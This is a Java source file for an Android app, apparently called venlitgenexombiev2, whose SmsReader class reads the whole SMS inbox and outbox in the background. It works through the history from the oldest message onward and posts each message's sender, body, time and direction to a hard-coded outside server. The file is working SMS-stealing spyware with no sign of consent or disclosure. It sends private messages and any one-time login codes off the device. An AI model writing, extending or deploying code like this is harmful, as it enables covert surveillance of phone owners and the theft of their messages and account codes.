package com.dawillygene.venlitgenexombiev2;

import android.content.ContentResolver;
import android.content.Context;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.util.Log;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class SmsReader {
    private static final String TAG = "SmsReader";
    private static final String SERVER_URL = "https://dawillygene.com/message/venlit.php";
    private static final String LAST_PROCESSED_ID_KEY = "last_processed_sms_id";
    private static final int MAX_MESSAGES_PER_BATCH = 1000; // Process 100 messages at a time as requested
    
    private static ExecutorService executorService = Executors.newFixedThreadPool(2);
    private static boolean isProcessing = false; // Prevent multiple simultaneous processing

    public static void readSms(Context context) {
        // Prevent multiple simultaneous SMS processing
        if (isProcessing) {
            Log.d(TAG, "SMS processing already in progress, skipping...");
            return;
        }
        
        // Run SMS reading in background thread to avoid blocking UI
        executorService.execute(new Runnable() {
            @Override
            public void run() {
                try {
                    isProcessing = true;
                    readSmsInBackground(context);
                } catch (Exception e) {
                    Log.e(TAG, "Error reading SMS in background", e);
                } finally {
                    isProcessing = false;
                }
            }
        });
    }

    private static void readSmsInBackground(Context context) {
        Log.d(TAG, "Starting SMS processing in background...");
        
        ContentResolver contentResolver = context.getContentResolver();
        Uri uri = Uri.parse("content://sms/");
        String[] projection = { "_id", "address", "body", "date", "type" };

        SharedPreferences prefs = context.getSharedPreferences("sms_prefs", Context.MODE_PRIVATE);
        String lastProcessedId = prefs.getString(LAST_PROCESSED_ID_KEY, null);

        // ONE-TIME RESET: Clear stored ID to start processing from oldest messages (2010)
        // This will run once, then the app will track progress normally
        if (lastProcessedId != null && lastProcessedId.equals("105369")) {
            Log.d(TAG, "ONE-TIME RESET: Starting fresh from oldest messages (2010)");
            prefs.edit().remove(LAST_PROCESSED_ID_KEY).apply();
            lastProcessedId = null;
        }

        Log.d(TAG, "Last processed SMS ID: " + (lastProcessedId != null ? lastProcessedId : "none - starting from oldest"));

        String selection = null;
        String[] selectionArgs = null;

        if (lastProcessedId != null) {
            selection = "_id > ? AND type IN (1, 2)";
            selectionArgs = new String[]{lastProcessedId};
        } else {
            selection = "type IN (1, 2)";
        }

        Cursor cursor = contentResolver.query(
                uri,
                projection,
                selection,
                selectionArgs,
                "date ASC LIMIT " + MAX_MESSAGES_PER_BATCH  // ASC = oldest first, chronological order
        );

        if (cursor != null && cursor.moveToFirst()) {
            List<SmsMessage> messagesToProcess = new ArrayList<>();
            String highestId = null;
            
            do {
                String id = cursor.getString(cursor.getColumnIndexOrThrow("_id"));
                // Track the highest ID in this batch (since we're processing chronologically)
                if (highestId == null || Integer.parseInt(id) > Integer.parseInt(highestId)) {
                    highestId = id;
                }
                
                String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                long timestamp = cursor.getLong(cursor.getColumnIndexOrThrow("date"));
                int type = cursor.getInt(cursor.getColumnIndexOrThrow("type"));

                String messageType = (type == 1) ? "received" : (type == 2) ? "sent" : null;
                if (messageType != null) {
                    messagesToProcess.add(new SmsMessage(id, address, body, timestamp, messageType));
                }
            } while (cursor.moveToNext());

            cursor.close();

            // Process messages in chronological order (they're already sorted by date ASC)
            Log.d(TAG, "Processing " + messagesToProcess.size() + " messages chronologically...");
            processSmsMessages(messagesToProcess);

            // Save the highest processed ID from this batch
            if (highestId != null) {
                prefs.edit().putString(LAST_PROCESSED_ID_KEY, highestId).apply();
                Log.d(TAG, "Updated last processed ID to: " + highestId);
            }
        } else {
            Log.d(TAG, "No new SMS found");
        }
        
        if (cursor != null) {
            cursor.close();
        }
    }

    private static void processSmsMessages(List<SmsMessage> messages) {
        for (SmsMessage message : messages) {
            // Send each message to server in a separate thread to avoid blocking
            executorService.execute(new Runnable() {
                @Override
                public void run() {
                    sendSmsToServer(message.address, message.body, message.timestamp, message.type);
                }
            });
        }
    }

    // Helper class for SMS message data
    private static class SmsMessage {
        String id, address, body, type;
        long timestamp;

        SmsMessage(String id, String address, String body, long timestamp, String type) {
            this.id = id;
            this.address = address;
            this.body = body;
            this.timestamp = timestamp;
            this.type = type;
        }
    }

    private static void sendSmsToServer(String address, String body, long timestamp, String messageType) {
        try {
            URL url = new URL(SERVER_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setDoInput(true);
            conn.setConnectTimeout(5000); // 5 second timeout
            conn.setReadTimeout(5000);

            OutputStream os = conn.getOutputStream();
            BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, "UTF-8"));
            writer.write("address=" + URLEncoder.encode(address, "UTF-8") +
                    "&body=" + URLEncoder.encode(body, "UTF-8") +
                    "&timestamp=" + timestamp +
                    "&type=" + URLEncoder.encode(messageType, "UTF-8"));
            writer.flush();
            writer.close();
            os.close();

            int responseCode = conn.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                String inputLine;
                StringBuilder response = new StringBuilder();
                while ((inputLine = in.readLine()) != null) {
                    response.append(inputLine);
                }
                in.close();
                Log.d(TAG, "✓ " + messageType.toUpperCase() + " message sent to server");
            } else {
                Log.e(TAG, "Server request failed with code: " + responseCode);
            }
            conn.disconnect();
        } catch (Exception e) {
            Log.e(TAG, "Error sending " + messageType + " SMS to server", e);
        }
    }

    /**
     * Reset SMS processing to start from the beginning
     * Call this method if you want to reprocess all SMS messages
     */
    public static void resetSmsProcessing(Context context) {
        SharedPreferences prefs = context.getSharedPreferences("sms_prefs", Context.MODE_PRIVATE);
        prefs.edit().remove(LAST_PROCESSED_ID_KEY).apply();
        Log.d(TAG, "SMS processing reset - will process all messages on next run");
    }
}